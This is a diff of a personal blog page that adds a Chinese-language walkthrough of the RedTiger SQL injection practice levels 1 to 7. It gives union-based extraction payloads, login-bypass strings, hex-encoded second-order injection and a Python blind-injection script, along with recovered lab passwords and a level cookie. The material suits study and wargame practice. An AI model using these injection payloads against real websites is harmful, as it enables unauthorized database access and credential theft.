@@ -7,17 +7,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | ddddhm | glotozz&#39;blog</title>
+  <title>redtiger-wp | ddddhm | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ddddhm | glotozz&#39;blog">
-<meta property="og:url" content="http://yoursite.com/archives/page/3/index.html">
+  <meta name="keywords" content="sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redtiger-wp">
+<meta property="og:url" content="http://yoursite.com/2019/08/31/redtiger-wp/index.html">
 <meta property="og:site_name" content="ddddhm | glotozz&#39;blog">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2019/08/31/LjJvkwum8g13clK.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/31/F8A95nBoMZjbmy2.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/31/qDwBgu7NchstfRW.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/31/EgvVXBN3sUc5wIH.png">
+<meta property="og:updated_time" content="2019-08-31T11:00:05.679Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ddddhm | glotozz&#39;blog">
+<meta name="twitter:title" content="redtiger-wp">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/31/LjJvkwum8g13clK.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -142,100 +149,327 @@
           </div>
           <div id="js-content" class="content-ll">
             
-  
-  
+<article id="post-redtiger-wp" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/25/爬虫入门/" class="archive-article-date">
-  	<time datetime="2019-07-25T05:20:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-25</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/25/爬虫入门/">爬虫入门</a>
+    <h1 class="article-title" itemprop="name">
+      redtiger-wp
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2019/08/31/redtiger-wp/" class="archive-article-date">
+  	<time datetime="2019-08-31T01:06:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-31</time>
+</a>
+        
+      </header>
+    
+    
+        <span class="archive-article-date">
+          阅读量 <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<blockquote>
+<p>昨天赵哥在群里问有没有web手帮他测测题目难度，我闲来无事。。。拿到题目后发现是sql注入，之后手注了半天也没结果，总觉得自己思路不清晰，需要整理自己的sql注入，在整理个字典，网上的字典总是用不惯</p>
+<p>正好有个redtiger（红牛？？？）的sql注入练习网站，题量也不多，一共10题，边做边积累😋</p>
+</blockquote>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><blockquote>
+<p>提示了user Hornoxe，tablename：    level1_users</p>
+</blockquote>
+<p>继续观察，发现有个Category很突兀，发现可能是个注入点，其实可以感觉数字型的可能性比较大，因为初始是cat=1</p>
+<p>并且有回显，所以先考虑联合注入（而且还把表名给我们了😁）</p>
+<h5 id="第一步，判断闭合方式"><a href="#第一步，判断闭合方式" class="headerlink" title="第一步，判断闭合方式"></a>第一步，判断闭合方式</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat=1&apos;		=&gt;		This category does not exist! 	说明不是单引号即是数字型</span><br><span class="line">cat=1&apos;#		=&gt;		This category does not exist!	说明是不是单引号</span><br><span class="line">cat=2-1		=&gt;		正常回显，再次确定是数字型</span><br></pre></td></tr></table></figure>
+
+<h5 id="第二步，判断字段数"><a href="#第二步，判断字段数" class="headerlink" title="第二步，判断字段数"></a>第二步，判断字段数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat=1 order by 4#	正常回显</span><br><span class="line">cat=1 order by 5#	This category does not exist! 数据库查询时报错，说明字段数小于5，即4</span><br></pre></td></tr></table></figure>
+
+<h5 id="第三步，判断回显处"><a href="#第三步，判断回显处" class="headerlink" title="第三步，判断回显处"></a>第三步，判断回显处</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat=0 union select 1,2,3,4#		回显3、4，注意将最前面的1改为0</span><br></pre></td></tr></table></figure>
+
+<h5 id="第四步，联合注入（虽然给了我们表名，我还是把流程走一遍把）"><a href="#第四步，联合注入（虽然给了我们表名，我还是把流程走一遍把）" class="headerlink" title="第四步，联合注入（虽然给了我们表名，我还是把流程走一遍把）"></a>第四步，联合注入（虽然给了我们表名，我还是把流程走一遍把）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat=0 union select 1,2,3,database()#	得到数据库名hackit</span><br><span class="line">cat=0 union select 1,2,3,table_name from information_schema.tables where table_schema=database()#	居然提示Some things are disabled!!!，前面走的太顺我甚至以为没有过滤。。</span><br></pre></td></tr></table></figure>
+
+<p>这里先stop一下，这里我觉得有必要整理一个字典，比如把上面用到的单词（符号）放入这个字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">database()</span><br><span class="line">table_name</span><br><span class="line">from</span><br><span class="line">information_schema.tables</span><br><span class="line">where</span><br><span class="line">table_schema</span><br><span class="line">=</span><br><span class="line">column_name</span><br><span class="line">information_schema.columns</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>虽然有一些知道这题没被过滤，但是多多益善就也加进去了😁</p>
+<p>还有就是get传值需要url编码，可以写个python脚本转换一下，这里默认是没有编码的</p>
+<p>还有就是我的单词取得比较长，但是可以用来缩小范围，缩小范围之后手注也不是不可</p>
+<p>还有这个字典现在太短了，会不断增加的。😂</p>
+</blockquote>
+<p>来bp里面试试</p>
+<p><img src="https://i.loli.net/2019/08/31/LjJvkwum8g13clK.png" alt="Snipaste_2019-08-31_10-50-59.png"></p>
+<p>说明那两张表被过滤了，尝试绕过</p>
+<p>大小写    ×，猜测应该是stristr()</p>
+<blockquote>
+<p>给我们表名不是没有道理的😂，但是字段咋办呢，这里只能猜，再stop一下</p>
+</blockquote>
+<p>整理个常用字段表，这里因为是密码，立马试出来是password，而且一般表单提交的name值有可能是字段</p>
+<p>测试用户名的字段是username</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">password</span><br><span class="line">pass</span><br><span class="line">user</span><br><span class="line">username</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>以后再添加</p>
+</blockquote>
+<h5 id="所以最后利用联合注入拿到密码"><a href="#所以最后利用联合注入拿到密码" class="headerlink" title="所以最后利用联合注入拿到密码"></a>所以最后利用联合注入拿到密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat=0 union select 1,2,3,password from level1_users#		=&gt;		thatwaseasy</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>直接就拿到了密码，如果没有拿到的话一般思路是用limit试试，注意#的url编码</p>
+</blockquote>
+<p>登陆成功得到flag👌</p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><blockquote>
+<p>目标依旧是login，提示Condition</p>
+</blockquote>
+<p>对于这种登录框</p>
+<blockquote>
+<p>三种思路：弱口令，万能密码，sql注入</p>
+</blockquote>
+<p>一般先尝试万能密码，stop一下,整理一个万能密码字典</p>
+<p>主要是针对下面的sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;&apos; and password=&apos;&apos;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">下面的都是第一行作为username，第二行作为password</span><br><span class="line"></span><br><span class="line">######################</span><br><span class="line">something</span><br><span class="line">&apos;or &apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">==&gt;	select * from users where username=&apos;&apos; and password=&apos;&apos;or &apos;1&apos;=&apos;1&apos;</span><br><span class="line"></span><br><span class="line">######################和第一个类似，or被过滤可以用这个碰碰运气</span><br><span class="line">something</span><br><span class="line">&apos;xor &apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">######################注释的思路，但是这题会报错，应该是过滤（替换）了什么，这时候应该双写绕过探测，大小写绕过探测（但是这里本来就没大小写），本来按照下面的sql语句是可以执行的😥，返回全部数据</span><br><span class="line">&apos;or 1/*</span><br><span class="line">*/=&apos;1</span><br><span class="line"></span><br><span class="line">==&gt; select * from users where username=&apos;&apos;or 1/*&apos; and password=&apos;*/=&apos;1&apos;</span><br><span class="line"></span><br><span class="line">######################</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先记录这三个把，别的异曲同工</p>
+</blockquote>
+<p>第一个payload成功bypass😜</p>
+<blockquote>
+<p>这里记录下MYSQL服务器的三种注释方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; #	从#到行尾</span><br><span class="line">&gt; -- 	从-- 到行尾，注意要求第二个破折号后面至少跟一个空格符（空格、tab、换行符等）这里可以stop一下，有兴趣也可以爆破一下</span><br><span class="line">&gt; /* */	结束序列不一定在同一行中，因此该语法允许注释跨越多行</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+</blockquote>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote>
+<p>目标是得到admin账户的密码</p>
+<p>提示是得到一个报错，还给了我们表名：level3_users</p>
+</blockquote>
+<p>之后是可以查看两个用户的基本信息，url地址中为usr=MDYzMjIzMDA2MTU2MTQxM，但是观察不出来是怎么加密的。。😭</p>
+<p>开始尝试各种单双引号井号等等，但是没有什么软用</p>
+<h5 id="最后居然是构造一个数组报错，所以标记一下"><a href="#最后居然是构造一个数组报错，所以标记一下" class="headerlink" title="最后居然是构造一个数组报错，所以标记一下"></a>最后居然是构造一个数组报错，所以标记一下</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr[]=MDYzMjIzMDA2MTU2MTQxM</span><br></pre></td></tr></table></figure>
+
+<p>发现存在inc文件，即用来包含的文件，访问得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">	// warning! ugly code ahead :)</span><br><span class="line">	// requires php5.x, sorry for that</span><br><span class="line">  		</span><br><span class="line">	function encrypt($str)</span><br><span class="line">	&#123;</span><br><span class="line">		$cryptedstr = &quot;&quot;;</span><br><span class="line">		srand(3284724);</span><br><span class="line">		for ($i =0; $i &lt; strlen($str); $i++)</span><br><span class="line">		&#123;</span><br><span class="line">			$temp = ord(substr($str,$i,1)) ^ rand(0, 255);</span><br><span class="line">			</span><br><span class="line">			while(strlen($temp)&lt;3)</span><br><span class="line">			&#123;</span><br><span class="line">				$temp = &quot;0&quot;.$temp;</span><br><span class="line">			&#125;</span><br><span class="line">			$cryptedstr .= $temp. &quot;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		return base64_encode($cryptedstr);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	function decrypt ($str)</span><br><span class="line">	&#123;</span><br><span class="line">		srand(3284724);</span><br><span class="line">		if(preg_match(&apos;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&apos;,$str))</span><br><span class="line">		&#123;</span><br><span class="line">			$str = base64_decode($str);</span><br><span class="line">			if ($str != &quot;&quot; &amp;&amp; $str != null &amp;&amp; $str != false)</span><br><span class="line">			&#123;</span><br><span class="line">				$decStr = &quot;&quot;;</span><br><span class="line">				</span><br><span class="line">				for ($i=0; $i &lt; strlen($str); $i+=3)</span><br><span class="line">				&#123;</span><br><span class="line">					$array[$i/3] = substr($str,$i,3);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				foreach($array as $s)</span><br><span class="line">				&#123;</span><br><span class="line">					$a = $s ^ rand(0, 255);</span><br><span class="line">					$decStr .= chr($a);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				return $decStr;</span><br><span class="line">			&#125;</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>是加解密的函数</p>
+<p>于是立马想着把给我们的两个例子解密一下，看看加密前的的sql语句</p>
+<p>但是两个都出现乱码，原因是因为<strong>相同的srand(xxxxxx)，window下和linux下会产生不同的值</strong></p>
+<p>windows下，</p>
+<p><img src="https://i.loli.net/2019/08/31/F8A95nBoMZjbmy2.png" alt="Snipaste_2019-08-31_13-47-50.png"></p>
+<p>放到linux下，</p>
+<p><img src="https://i.loli.net/2019/08/31/qDwBgu7NchstfRW.png" alt="Snipaste_2019-08-31_13-47-08.png"></p>
+<p>因为有回显，尝试构造联合注入，又给了我们表名，估计和第一题类似</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TheCow&apos;order by 5#</span><br><span class="line">==&gt;		MDYzMjIzMDA2MTU2MTQxMjU0MjE2MDI0MjA1MTE1MTg1MTUzMDkxMjM5MDI5MDI4MjU1MDg0MTkw</span><br><span class="line"></span><br><span class="line">TheCow&apos;order by 7#</span><br><span class="line">==&gt;		MDYzMjIzMDA2MTU2MTQxMjU0MjE2MDI0MjA1MTE1MTg1MTUzMDkxMjM5MDI5MDI4MjU1MDg2MTkw</span><br></pre></td></tr></table></figure>
+
+<p>最后测得字段数为7，回显处为2，4，5，6，7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0&apos;union select 1,2,3,4,5,6,7#</span><br><span class="line">==&gt;		MDkxMTQ0MDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMjAzMTY2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0&apos;union select 1,password,3,4,5,6,7 from level3_users where username=&apos;Admin&apos;#</span><br><span class="line">==&gt;		</span><br><span class="line">MDkxMTQ0MDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDE3MjUyMDI1MTI2MTU2MTc2MTMzMDAwMjQ2MTU3MjA4MTc3MDk2MTI4MjIwMDUwMDUyMjMxMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTkwMjIwMDcxMDQwMjIwMjA5MDMz</span><br></pre></td></tr></table></figure>
+
+<p>得到 thisisaverysecurepasswordEEE5rt</p>
+<p>登陆得到flag👌</p>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><blockquote>
+<p>提示得到    level4_secret表的    keyword字段    的第一个数据</p>
+</blockquote>
+<p>回显是返回的结果行数，只能是盲注</p>
+<p>判断闭合方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos;		=&gt;		0</span><br><span class="line">1&apos;#		=&gt;		0</span><br><span class="line">2-1		=&gt;		1</span><br></pre></td></tr></table></figure>
+
+<p>数字型，感觉通常id字段都是数字型😀</p>
+<p>盲注测试，下面其实不用#闭合也没事</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and 1#	=&gt;		1</span><br><span class="line">1 and 0#	=&gt;		0</span><br></pre></td></tr></table></figure>
+
+<p>写个脚本，记个笔记，这里一定要加上    <strong>cookie</strong>    😥，别问我怎么知道的</p>
+<blockquote>
+<p>对于这种明显有检查的，需要加上cookie</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">url = &quot;http://redtiger.labs.overthewire.org/level4.php?id=&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">tmp = 0</span><br><span class="line">cookie =&#123;</span><br><span class="line">	&quot;level4login&quot;:&quot;put_the_kitten_on_your_head&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    if tmp == 1:</span><br><span class="line">        break</span><br><span class="line">    tmp = 1</span><br><span class="line">    for j in range(32,127):</span><br><span class="line">        payload = &quot;select keyword from level4_secret&quot;</span><br><span class="line">        #</span><br><span class="line">        id = &quot;1 and ascii(substr((&quot;+payload+&quot;),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot; #&quot;</span><br><span class="line">        print(id)</span><br><span class="line">        url2 = url+id</span><br><span class="line">        r=requests.get(url=url2,cookies=cookie)</span><br><span class="line">        if &quot;Query returned 1 rows.&quot; in r.content.decode(&quot;utf-8&quot;):</span><br><span class="line">            tmp = 0</span><br><span class="line">            flag=flag+chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>得到killstickswithbr1cks!</p>
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote>
+<p>目标是Bypass</p>
+<p>直接把禁用的给我们了：    substring、substr、(、)、mid</p>
+<p>又提示这不是盲注，密码是md5加密，并让我们查看登陆失败的错误</p>
+<p>其中密码md5加密应该是数据库中存的是md5加密后的值，这个在业务中通常用来保护用户密码的安全性</p>
+</blockquote>
+<p>存在回显，尝试联合注入</p>
+<p>开始尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">=&gt;	User not found!</span><br><span class="line"></span><br><span class="line">1&apos;#</span><br><span class="line">1</span><br><span class="line">=&gt;	User not found!，说明是单引号闭合</span><br><span class="line"></span><br><span class="line">1&apos; order by 3#</span><br><span class="line">1</span><br><span class="line">=&gt;	mysql_num_rows() expects parameter 1 to b...说明字段数为2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&apos;union select 1,md5(1)#</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">=&gt;	成功</span><br></pre></td></tr></table></figure>
+
+<p>这里很容易猜测后台的查询语句大概是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users where username=&apos;xxx&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><blockquote>
+<p>目标是成功登陆level6_users表中status=1的第一个用户</p>
+</blockquote>
+<p>开始尝试前，感觉还是数字型😁</p>
+<p>存在回显，尝试联合注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">user=1&apos;</span><br><span class="line">=&gt;	Warning: mysql_fetch_object(): supplied argument is not a valid MySQL result resource</span><br><span class="line"></span><br><span class="line">user=1 order by 6#</span><br><span class="line">=&gt;	报错，说明字段数为5</span><br><span class="line"></span><br><span class="line">user=0 union select 1,2,3,4,5#</span><br><span class="line">=&gt;	User not found，那么需要判断哪一个字段对应的是username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user=0 union select username,2,3,4,5 from level6_users#</span><br><span class="line">=&gt;	错误</span><br><span class="line">user=0 union select 1,username,3,4,5 from level6_users#</span><br><span class="line">=&gt;	正常，出现deddlef账户</span><br><span class="line"></span><br><span class="line">user=0 union select 1,username,3,4,5 from level6_users where status=1#</span><br><span class="line">=&gt;	出现了admin账户</span><br></pre></td></tr></table></figure>
+
+<p>但是要怎么把数据带出来呢？？？😘，email处，利用<strong>二次注入</strong>，记个笔记</p>
+<p>email的查询肯定是第二次查询的，因为根据上面的联合注入发现email并没有被改变，很有可能第二次根据username</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select email from users where username=&apos;&apos;</span><br></pre></td></tr></table></figure>
+
+<p>所以在username处进行联合注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">username=&apos;admin&apos;order by 3#&apos;</span><br><span class="line">user=0 union select 1,&apos;admin&apos;order by 3#&apos;,3,4,5 from level6_users where status=1#</span><br><span class="line">=&gt;	报错</span><br><span class="line"></span><br><span class="line">username=&apos;admin&apos;order by 2#&apos;</span><br><span class="line">user=0 union select 1,&apos;admin&apos;order by 2#&apos;,3,4,5 from level6_users where status=1#</span><br><span class="line">=&gt;	报错</span><br><span class="line"></span><br><span class="line">username=&apos;admin&apos;order by 1#&apos;</span><br><span class="line">user=0 union select 1,&apos;admin&apos;order by 1#&apos;,3,4,5 from level6_users where status=1#</span><br><span class="line">=&gt;	报错</span><br><span class="line">。。。。。。。。</span><br><span class="line">这里记个笔记，应该是被处理过了，用16进制编码试试</span><br><span class="line">username=&apos;admin&apos;order by 2#&apos;</span><br><span class="line">user=0 union select 1,0x61646D696E276F72646572206279203223,3,4,5 from level6_users where status=1#</span><br><span class="line">=&gt;	正常</span><br><span class="line">username=&apos;admin&apos;order by 3#&apos;</span><br><span class="line">user=0 union select 1,0x61646D696E276F72646572206279203323,3,4,5 from level6_users where status=1#</span><br><span class="line">=&gt;	正常</span><br><span class="line">username=&apos;admin&apos;order by 6#&apos;</span><br><span class="line">user=0 union select 1,0x61646D696E276F72646572206279203623,3,4,5 from level6_users where status=1#</span><br><span class="line">=&gt;  报错</span><br><span class="line">username=&apos;admin&apos;order by 5#&apos;</span><br><span class="line">user=0 union select 1,0x61646D696E276F72646572206279203523,3,4,5 from level6_users where status=1#</span><br><span class="line">=&gt;  正常</span><br><span class="line"></span><br><span class="line">！！！字段数为5</span><br><span class="line">判断回显处</span><br><span class="line">username=&apos;&apos;union select 1,2,3,4,5#&apos;</span><br><span class="line">user=0 union select 1,0x27756E696F6E2073656C65637420312C322C332C342C3523,3,4,5 from level6_users where status=1#</span><br><span class="line">=&gt;	4</span><br><span class="line"></span><br><span class="line">直接查密码</span><br><span class="line">username=&apos;&apos;union select 1,2,3,password,5 from level6_users where status=1#&apos;</span><br><span class="line">user=0 union select 1,0x27756E696F6E2073656C65637420312C322C332C70617373776F72642C352066726F6D206C6576656C365F7573657273207768657265207374617475733D3123,3,4,5 from level6_users where status=1#</span><br></pre></td></tr></table></figure>
+
+<p>终于出来了，截个图纪念一下👌</p>
+<p><img src="https://i.loli.net/2019/08/31/EgvVXBN3sUc5wIH.png" alt="Snipaste_2019-08-31_17-48-14.png"></p>
+<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><blockquote>
+<p>获取发布google新闻的人的名字，表名：level7_news，列名：autor</p>
+<p>并且不能注释、substr、substring、ascii、mid、like</p>
+</blockquote>
+<p>只有一个搜索框，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">=&gt;正常</span><br><span class="line"></span><br><span class="line">1&apos;</span><br><span class="line">=&gt;提示语法错误</span><br><span class="line">An error occured!: </span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;%&apos; OR text.title LIKE &apos;%1&apos;%&apos;)&apos; at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &apos;%1&apos;%&apos; OR text.title LIKE &apos;%1&apos;%&apos;)</span><br><span class="line"></span><br><span class="line">1-- </span><br><span class="line">=&gt;Some things are disabled!说明被禁用</span><br><span class="line">使用能替换%20，用bp测试一下</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+        <div class="page-reward">
